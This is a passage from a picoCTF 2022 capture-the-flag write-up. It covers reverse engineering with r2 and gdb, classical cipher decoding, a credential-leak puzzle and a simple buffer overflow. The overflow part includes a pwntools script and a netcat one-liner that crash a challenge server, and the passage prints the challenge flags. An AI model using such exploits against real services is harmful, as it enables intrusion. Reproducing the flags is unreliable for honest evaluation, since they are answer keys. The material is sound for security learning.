    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0x1f);
  if (cVar3 != 'f') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0x1e);
  if (cVar3 != '9') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0x1d);
  if (cVar3 != '5') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0x1c);
  if (cVar3 != 'c') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0x1b);
  if (cVar3 != '6') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0x1a);
  if (cVar3 != '2') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0x19);
  if (cVar3 != '1') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0x18);
  if (cVar3 != '_') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0x17);
  if (cVar3 != 'd') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0x16);
  if (cVar3 != '3') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0x15);
  if (cVar3 != 'r') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0x14);
  if (cVar3 != '1') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0x13);
  if (cVar3 != 'u') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0x12);
  if (cVar3 != 'q') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0x11);
  if (cVar3 != '3') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0x10);
  if (cVar3 != 'r') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0xf);
  if (cVar3 != '_') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0xe);
  if (cVar3 != 'g') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0xd);
  if (cVar3 != 'n') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0xc);
  if (cVar3 != '1') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0xb);
  if (cVar3 != 'l') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(10);
  if (cVar3 != '0') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(9);
  if (cVar3 != '0') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(8);
  if (cVar3 != '7') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(7);
  if (cVar3 != '{') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(6);
  if (cVar3 != 'F') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(5);
  if (cVar3 != 'T') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(4);
  if (cVar3 != 'C') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(3);
  if (cVar3 != 'o') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(2);
  if (cVar3 != 'c') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(1);
  if (cVar3 != 'i') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
  cVar3 = objectRef.charAt(0);
  if (cVar3 != 'p') {
    pPVar1 = System.out;
    pPVar1.println("Invalid key");
    return;
  }
```

```bash
➜  freshjava java KeygenMe
Enter key:
picoCTF{700l1ng_r3qu1r3d_126c59f0}
Valid key
```

Flag : `picoCTF{700l1ng_r3qu1r3d_126c59f0}`

### Bbbbloat

Can you get the flag?
Reverse engineer this binary.

```bash
➜  Bbbbloat ./bbbbloat 
What's my favorite number? 99
Sorry, that's not it!
```

Using r2 we can dynamically debug the program as below.

```bash
➜  Bbbbloat r2 -d bbbbloat 
Process with PID 68182 started...
= attach 68182 68182
bin.baddr 0x559726213000
Using 0x559726213000
asm.bits 64
Warning: r_bin_file_hash: file exceeds bin.hashlimit
 -- Mind the trap.
[0x7fac5c90e100]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[TOFIX: aaft can't run in debugger mode.ions (aaft)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x7fac5c90e100]> afll
address            size  nbbs edges    cc cost          min bound range max bound          calls locals args xref frame name
================== ==== ===== ===== ===== ==== ================== ===== ================== ===== ====== ==== ==== ===== ====
0x0000559726214160   46     1     0     1   15 0x0000559726214160    46 0x000055972621418e     1    0      1    0     8 entry0
0x0000559726216fe0 4121     1     0     1 2060 0x0000559726216fe0  4121 0x0000559726217ff9     0    0      0    1     0 reloc.__libc_start_main
0x00005597262140d0   11     1     0     1    4 0x00005597262140d0    11 0x00005597262140db     0    0      0    1     0 sym.imp.free
0x00005597262140e0   11     1     0     1    4 0x00005597262140e0    11 0x00005597262140eb     0    0      0    1     0 sym.imp.putchar
0x00005597262140f0   11     1     0     1    4 0x00005597262140f0    11 0x00005597262140fb     0    0      0    1     0 sym.imp.puts
0x0000559726214100   11     1     0     1    4 0x0000559726214100    11 0x000055972621410b     0    0      0    0     0 sym.imp.strlen
0x0000559726214110   11     1     0     1    4 0x0000559726214110    11 0x000055972621411b     0    0      0    1     0 sym.imp.__stack_chk_fail
0x0000559726214120   11     1     0     1    4 0x0000559726214120    11 0x000055972621412b     0    0      0    1     0 sym.imp.printf
0x0000559726214130   11     1     0     1    4 0x0000559726214130    11 0x000055972621413b     0    0      0    1     0 sym.imp.fputs
0x0000559726213000  341     3     2     3  158 0x0000559726213000   348 0x000055972621315c     0    0      2    0     0 loc.imp._ITM_deregisterTMCloneTable
0x0000559726214140   11     1     0     1    4 0x0000559726214140    11 0x000055972621414b     0    0      0    1     0 sym.imp.__isoc99_scanf
0x0000559726214150   11     1     0     1    4 0x0000559726214150    11 0x000055972621415b     0    0      0    0     0 sym.imp.strdup
0x0000559726214240   60     5     5     4   22 0x00005597262141c0   137 0x0000559726214249     0    0      0    0     0 entry.init0
0x0000559726214200   54     5     5     4   24 0x0000559726214200    57 0x0000559726214239     2    0      0    0     8 entry.fini0
0x00005597262140c0   11     1     0     1    4 0x00005597262140c0    11 0x00005597262140cb     0    0      0    1     0 fcn.5597262140c0
0x0000559726214190   34     4     4     4   14 0x0000559726214190    41 0x00005597262141b9     0    0      0    1     0 fcn.559726214190
0x0000559726214307  675     6     6     4  178 0x0000559726214307   675 0x00005597262145aa     8   10      2    1    88 main
[0x7fac5c90e100]> db main
[0x7fac5c90e100]> pdf@main
            ; DATA XREF from entry0 @ 0x559726214181
┌ 675: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_50h @ rbp-0x50
│           ; var int64_t var_44h @ rbp-0x44
│           ; var int64_t var_40h @ rbp-0x40
│           ; var int64_t var_3ch @ rbp-0x3c
│           ; var int64_t var_38h @ rbp-0x38
│           ; var int64_t var_30h @ rbp-0x30
│           ; var int64_t var_28h @ rbp-0x28
│           ; var int64_t var_20h @ rbp-0x20
│           ; var int64_t var_18h @ rbp-0x18
│           ; var int64_t var_8h @ rbp-0x8
│           ; arg int argc @ rdi
│           ; arg char **argv @ rsi
│           0x559726214307 b    f30f1efa       endbr64
│           0x55972621430b      55             push rbp
│           0x55972621430c      4889e5         mov rbp, rsp
│           0x55972621430f      4883ec50       sub rsp, 0x50
│           0x559726214313      897dbc         mov dword [var_44h], edi ; argc
│           0x559726214316      488975b0       mov qword [var_50h], rsi ; argv
[0x7fac5c90e100]> db 0x5597262144cb
[0x7fac5c90e100]> dc
hit breakpoint at: 559726214307
[0x55972621430c]> dc
What's my favorite number? 99
hit breakpoint at: 5597262144cb
[0x5597262144cb]> dr
rax = 0x00000063
rbx = 0x5597262145b0
rcx = 0x00000000
rdx = 0x000d2c49
r8 = 0x0000000a
r9 = 0x00000000
r10 = 0x7fac5c892ac0
r11 = 0x00000000
r12 = 0x559726214160
r13 = 0x7ffec33e00b0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x000d2c49
rdi = 0x000d2c49
rsp = 0x7ffec33dff70
rbp = 0x7ffec33dffc0
rip = 0x5597262144cb
rflags = 0x00000202
orax = 0xffffffffffffffff
[0x5597262144cb]> dr rax=0x86187
0x00000063 ->0x00086187
[0x5597262144cb]> dc
picoCTF{cu7_7h3_bl047_2d7aeca1}
[0x7fac5c7da176]> 
[0x7fac5c7da176]> dc
child exited with status 0

==> Process finished
```

Flag : `picoCTF{cu7_7h3_bl047_2d7aeca1}`

### unpackme

Can you get the flag?
Reverse engineer this binary.

```bash
➜  unpackeme file unpackme-upx 
unpackme-upx: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header
➜  unpackeme upx -d unpackme-upx -o unpackme
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   1002408 <-    379116   37.82%   linux/amd64   unpackme

Unpacked 1 file.
➜  unpackeme ./unpackme 
What's my favorite number? 223
Sorry, that's not it!
```

Alright time to reverse engineer the binary after unpacking.

![1](https://bn1304files.storage.live.com/y4mV4EySxpD-ds-sjaeXk5i7UL8kUKLKU5kj-KHs4IYUJiE1LVyZ2y4eVEXSbqqv3MWKaYMl39K25djJPfnWHiiQz4J-EIx6TFC7eHIyOQV_SW71CRO7UaF1WSf9TRPQoNoZ5sjDY5bUMZasXy6uasqe85qFOtrIJzxM8BMYXSidbd9yuf_Tz1ZRQhO5fK8Rifl?width=2860&height=1732&cropmode=none)

![2](https://bn1304files.storage.live.com/y4mYJs-y-nePNiqnLFlhAMQblEs-bf8Mehff9d2zpr3Yh_gXkLBvAl6VA6keEq7J8GmQGD02noZvJO1NSrC_77-tq6lvLxR9EtJYYPkZkEcF03iy7rE-aKN5Bk1T56K-keshlUQPnUrMbJG_5s0DvttgZcc5yTeZFUXSMD4VgZVEf6Wukqi05n2UCOjwW-xTKFD?width=2860&height=1732&cropmode=none)

![3](https://bn1304files.storage.live.com/y4m1-HwKOFSnekV_Wl6inu0UFBiHgzQbLFFlwnl5bAw9Cf7CdRvyPkiExaxjdRZhmX31ycGo883WClg46hcot-TExh-IoMeNoCBzkD5rhEyqQII6cuoduwFsI7KNT6OJMmu7Mcq5sN8C4WnV5UJDoPQTr4uf2zXI7bjfj7zqtYft6E1dXxs5rTx_xY9Tf2Zn0ku?width=2860&height=1732&cropmode=none)

![4](https://bn1304files.storage.live.com/y4mlFbsKUi5n1UP_6GC2lODp7EIgQBzBwk0XVE00BG9fMG5a19W7figOyg_IuB15uow4Su_mF0F_szEBnBI9w93anhLNmyla0afKfYsxinkh9KgxOLtSWBkCBJ2aPJnf_yX_MipfVu8bJPvNbM706Z9LCvcm3B0qUAk-o_8hgFHQCkwe_3GxsTdVFkPIZWhZW9I?width=2860&height=1732&cropmode=none)

![5](https://bn1304files.storage.live.com/y4mw_7Nt7F_A2fnhkpncLXdA_9flXeC98_zBYCj0-OxIQlniu4tRUmNwMF3k-HAZlq0j7xQAHaZQZYtTHkDLOgNmRO_KgipawT_4OLW6WG6G4LjBE9U-WWYCc_gwmLmBUOloBeG4JeDFWN-XGpSj7evMQ7xb276s0bETRezArkj0-AMrc2jZkG9KtIHppvOYhMi?width=2860&height=1732&cropmode=none)

```bash
➜  unpackeme gdb unpackme
(gdb) set disassembly-flavor intel
(gdb) disassemble main
(gdb) break main
Breakpoint 1 at 0x401e73
(gdb) break *(main+133)
Breakpoint 2 at 0x401ef8
(gdb) run
Starting program: /cases/pico2022/revEngineer/unpackeme/unpackme

Breakpoint 1, 0x0000000000401e73 in main ()
(gdb) continue
Continuing.
What's my favorite number? 99
Breakpoint 2, 0x0000000000401ef8 in main ()
rax            0x63                99
rbx            0x400530            4195632
rcx            0x0                 0
rdx            0x0                 0
rsi            0x0                 0
rdi            0x7fffffffd930      140737488345392
rbp            0x7fffffffdec0      0x7fffffffdec0
rsp            0x7fffffffde70      0x7fffffffde70
r8             0xa                 10
r9             0x0                 0
r10            0x4ba400            4957184
r11            0x0                 0
r12            0x402ff0            4206576
r13            0x0                 0
--Type <RET> for more, q to quit, c to continue without paging--
(gdb) set $eax=0xb83cb 
rax            0xb83cb             754635
rbx            0x400530            4195632
rcx            0x0                 0
rdx            0x0                 0
rsi            0x0                 0
rdi            0x7fffffffd930      140737488345392
rbp            0x7fffffffdec0      0x7fffffffdec0
rsp            0x7fffffffde70      0x7fffffffde70
r8             0xa                 10
r9             0x0                 0
r10            0x4ba400            4957184
r11            0x0                 0
r12            0x402ff0            4206576
r13            0x0                 0
--Type <RET> for more, q to quit, c to continue without paging--
(gdb) ni
0x0000000000401efd in main ()
0x0000000000401eff in main ()
(gdb) continue
Continuing.
picoCTF{up><_m3_f7w_ed7b0850}
[Inferior 1 (process 67587) exited normally]
```

Flag : `picoCTF{up><_m3_f7w_ed7b0850}`

## Cryptography

### basic-mod1

We found this weird message being passed around on the servers, we think we have a working decrpytion scheme.
Download the message here.
Take each number mod 37 and map it to the following character set: 0-25 is the alphabet (uppercase), 26-35 are the decimal digits, and 36 is an underscore.
Wrap your decrypted message in the picoCTF flag format (i.e. picoCTF{decrypted_message})

```python
import string

deciDigits = ['26', '27', '28', '29', '30', '31', '32', '33', '34', '35']
numDict = {}
for idx in range(len(deciDigits)):
    numDict[idx] = deciDigits[idx]
numDict = {v: k for k, v in numDict.items()}

alphaDict = dict(enumerate(string.ascii_uppercase))

def readFileNDecode():
    with open('message.txt', 'r') as msg:
        flag = []
        msg_list = list(filter(None, msg.read().split(' ')))
        for i in msg_list:
            i = int(i)
            modNum = i % 37
            if modNum < 26:
                flag.append(alphaDict[modNum])
            elif modNum < 36:
                flag.append(numDict[str(modNum)])
            elif modNum == 36:
                flag.append('_')
        flag = map(str, flag)
        flag = ''.join(flag)
        picoFlag = f"picoCTF{{{flag}}}"
        print(picoFlag)
        
    
readFileNDecode()
```

```bash
➜  basicmod1 python basicmod1.py 
picoCTF{R0UND_N_R0UND_8C863EE7}
```

Flag : `picoCTF{R0UND_N_R0UND_8C863EE7}`

### substitution0

A message has come in but it seems to be all scrambled. Luckily it seems to have the key at the beginning. Can you crack this substitution cipher?

Cipher text as below. The key is the `PAQZTNDSRYWFEXGJKCVLBUHOMI`

```text
PAQZTNDSRYWFEXGJKCVLBUHOMI 

Stctbjgx Ftdcpxz pcgvt, hrls p dcput pxz vlpltfm prc, pxz acgbdsl et lst attlft
ncge p dfpvv qpvt rx hsrqs rl hpv txqfgvtz. Rl hpv p atpblrnbf vqpcpaptbv, pxz, pl
lspl lret, bxwxghx lg xplbcpfrvlv—gn qgbcvt p dctpl jcrit rx p vqrtxlrnrq jgrxl
gn urth. Lstct htct lhg cgbxz afpqw vjglv xtpc gxt tolcterlm gn lst apqw, pxz p
fgxd gxt xtpc lst glstc. Lst vqpftv htct toqttzrxdfm spcz pxz dfgvvm, hrls pff lst
pjjtpcpxqt gn abcxrvstz dgfz. Lst htrdsl gn lst rxvtql hpv utcm ctepcwpaft, pxz,
lpwrxd pff lsrxdv rxlg qgxvrztcplrgx, R qgbfz spczfm afpet Ybjrltc ngc srv gjrxrgx
ctvjtqlrxd rl.

Lst nfpd rv: jrqgQLN{5BA5717B710X_3U0FB710X_PP1QQ2A7}
```

Using <https://www.dcode.fr/substitution-monoalphabetique>

```text
HEREUPON LEGRAND AROSE, WITH A GRAVE AND STATELY AIR, AND BROUGHT ME THE BEETLE
FROM A GLASS CASE IN WHICH IT WAS ENCLOSED. IT WAS A BEAUTIFUL SCARABAEUS, AND, AT
THAT TIME, UNKNOWN TO NATURALISTS--OF COURSE A GREAT PRIZE IN A SCIENTIFIC POINT
OF VIEW. THERE WERE TWO ROUND BLACK SPOTS NEAR ONE EXTREMITY OF THE BACK, AND A
LONG ONE NEAR THE OTHER. THE SCALES WERE EXCEEDINGLY HARD AND GLOSSY, WITH ALL THE
APPEARANCE OF BURNISHED GOLD. THE WEIGHT OF THE INSECT WAS VERY REMARKABLE, AND,
TAKING ALL THINGS INTO CONSIDERATION, I COULD HARDLY BLAME JUPITER FOR HIS OPINION
RESPECTING IT.

THE FLAG IS: PICOCTF{5UB5717U710N_3V0LU710N_AA1CC2B7}
```

Flag : `PICOCTF{5UB5717U710N_3V0LU710N_AA1CC2B7}`

### basic-mod2

Description

A new modular challenge!
Download the message here.
Take each number mod 41 and find the modular inverse for the result. Then map to the following character set: 1-26 are the alphabet, 27-36 are the decimal digits, and 37 is an underscore.
Wrap your decrypted message in the picoCTF flag format (i.e. picoCTF{decrypted_message})

```python
import string

deciDigits = ['27', '28', '29', '30', '31', '32', '33', '34', '35', '36']
numDict = {}
for idx in range(len(deciDigits)):
    numDict[idx] = deciDigits[idx]
numDict = {v: k for k, v in numDict.items()}

alphaDict = dict(enumerate(string.ascii_uppercase, 1))


def egcd(a, b):
    '''helper function to find modinv'''
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)


def modinv(a, m):
    '''helper function to find modinv'''
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m


def readFileNDecode():
    with open('message.txt', 'r') as msg:
        flag = []
        msg_list = list(filter(None, msg.read().split(' ')))
        for i in msg_list:
            i = int(i)
            modInvNum = modinv(i, 41)
            if modInvNum < 27:
                flag.append(alphaDict[modInvNum])
            elif modInvNum < 37:
                flag.append(numDict[str(modInvNum)])
            elif modInvNum == 37:
                flag.append('_')
        flag = map(str, flag)
        flag = ''.join(flag)
        picoFlag = f"picoCTF{{{flag}}}"
        print(picoFlag)


readFileNDecode()
```

```bash
➜  pico2022 git:(main) ✗ python basicmod2.py 
picoCTF{1NV3R53LY_H4RD_F6747912}
```

Flag : `picoCTF{1NV3R53LY_H4RD_F6747912}`

### Vignere

Can you decrypt this message?
Decrypt this message using this key "CYLAB". `rgnoDVD{O0NU_WQ3_G1G3O3T3_A1AH3S_e481bf5f}`

Flag : `picoCTF{D0NT_US3_V1G3N3R3_C1PH3R_c481du5f}`
Using <https://www.dcode.fr/vigenere-cipher>

### credstuff

We found a leak of a blackmarket website's login credentials. Can you find the password of the user cultiris and successfully decrypt it?
Download the leak here.
The first user in usernames.txt corresponds to the first password in passwords.txt. The second user corresponds to the second password, and so on.

Flag : `picoCTF{C7r1F_54V35_71M3}`

![image](https://bn1304files.storage.live.com/y4mV2YsQWbh2VIpNw1ad0aNSTaB9erEuzEMB9qn9DTePZHr4nV4lXLI5qndi1Tx9uN68wZtIGR8eMrOFKm557DhO1xLUbd-H7RWg2F4ChV4SQ3ofSwZJX0kExHhr-HdHcKKfgM6j-uhjSvAPASK1FznFL8Gu29MVGecj0z17Ek40INgP7XotnjmZzjb83Yglk_1?width=2654&height=1620&cropmode=none)

`cultiris:cvpbPGS{P7e1S_54I35_71Z3}`

Using [caesar-cipher](https://www.dcode.fr/caesar-cipher).

### rail-fence

A type of transposition cipher is the rail fence cipher, which is described here. Here is one such cipher encrypted using the rail fence with 4 rails. Can you decrypt it?
Download the message here.
Put the decoded message in the picoCTF flag format, picoCTF{decoded_message}.
`Ta _7N6D54hlg:W3D_H3C31N__510ef sHR053F38N43D28 i33___N2`

Flag : `picoCTF{WH3R3_D035_7H3_F3NC3_8361N_4ND_3ND_55228140}`

Using cyberchef : <https://gchq.github.io/CyberChef/#recipe=Rail_Fence_Cipher_Decode(4,0)&input=VGEgXzdONkQ1NGhsZzpXM0RfSDNDMzFOX181MTBlZiBzSFIwNTNGMzhONDNEMjggaTMzX19fTjI>

`The flag is: WH3R3_D035_7H3_F3NC3_8361N_4ND_3ND_55228140`

### substitution1

A second message has come in the mail, and it seems almost identical to the first one. Maybe the same thing will work again.
Download the message here.

`WILh (hjpai lpa wrtikan ijn lbrc) ran r ietn pl wpgtkina hnwkazie wpgtnizizpu. Wpuinhiruih ran tanhnuiny szij r hni pl wjrbbnucnh sjzwj inhi ijnza wanrizdzie, inwjuzwrb (ruy cppcbzuc) hfzbbh, ruy tapobng-hpbdzuc rozbzie. Wjrbbnucnh khkrbbe wpdna r ukgona pl wrincpaznh, ruy sjnu hpbdny, nrwj eznbyh r hiazuc (wrbbny r lbrc) sjzwj zh hkogziiny ip ru pubzun hwpazuc hnadzwn. WILh ran r canri sre ip bnrau r szyn raare pl wpgtkina hnwkazie hfzbbh zu r hrln, bncrb nudzapugnui, ruy ran jphiny ruy tbreny oe grue hnwkazie capkth rapkuy ijn spaby lpa lku ruy tarwizwn. Lpa ijzh tapobng, ijn lbrc zh: tzwpWIL{LA3VK3UWE_4774WF5_4A3_W001_O810YY84}`

Flag : `picoCTF{FR3QU3NCY_4774CK5_4R3_C001_B810DD84}`

Using <https://www.dcode.fr/monoalphabetic-substitution>

`CTFS (SHORT FOR CAPTURE THE FLAG) ARE A TYPE OF COMPUTER SECURITY COMPETITION. CONTESTANTS ARE PRESENTED WITH A SET OF CHALLENGES WHICH TEST THEIR CREATIVITY, TECHNICAL (AND GOOGLING) SKILLS, AND PROBLEM-SOLVING ABILITY. CHALLENGES USUALLY COVER A NUMBER OF CATEGORIES, AND WHEN SOLVED, EACH YIELDS A STRING (CALLED A FLAG) WHICH IS SUBMITTED TO AN ONLINE SCORING SERVICE. CTFS ARE A GREAT WAY TO LEARN A WIDE ARRAY OF COMPUTER SECURITY SKILLS IN A SAFE, LEGAL ENVIRONMENT, AND ARE HOSTED AND PLAYED BY MANY SECURITY GROUPS AROUND THE WORLD FOR FUN AND PRACTICE. FOR THIS PROBLEM, THE FLAG IS: PICOCTF{FR3QU3NCY_4774CK5_4R3_C001_B810DD84}`

## Binary Exploitation

### CVE-XXXX-XXXXX

Enter the CVE of the vulnerability as the flag with the correct flag format:
picoCTF{CVE-XXXX-XXXXX} replacing XXXX-XXXXX with the numbers for the matching vulnerability.
The CVE we're looking for is the first recorded remote code execution (RCE) vulnerability in 2021 in the Windows Print Spooler Service, which is available across desktop and server versions of Windows operating systems. The service is used to manage printers and print servers.

With simple googling.
<https://nsfocusglobal.com/windows-print-spooler-rce-vulnerabilities-cve-2021-1675-cve-2021-34527-mitigation-guide/>

Flag : `picoCTF{CVE-2021-34527}`

### buffer overflow 0

Smash the stack
Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here. And connect with it using:

You can programmatically write a python script to overflow the buffer of the remote program as below.

```python
#!/usr/bin/python

import pwn

host = "saturn.picoctf.net"
port = 55986
payload = bytes('A'*101, encoding="ascii")



conn = pwn.remote(host,port)
conn.sendlineafter(b' ',payload)
output = conn.recvline(timeout=5)

print(output)
```

```bash
➜  bof0 python bof.py 
[+] Opening connection to saturn.picoctf.net on port 55986: Done
b'picoCTF{ov3rfl0ws_ar3nt_that_bad_ee2fd2b1}\n'
[*] Closed connection to saturn.picoctf.net port 55986
```

Or you can just manually overflow over netcat connection as below.

```bash
➜  bof0 python -c "print('A'*101)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
➜  bof0 nc saturn.picoctf.net 55986
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{ov3rfl0ws_ar3nt_that_bad_ee2fd2b1}
```

Flag : `picoCTF{ov3rfl0ws_ar3nt_that_bad_ee2fd2b1}`
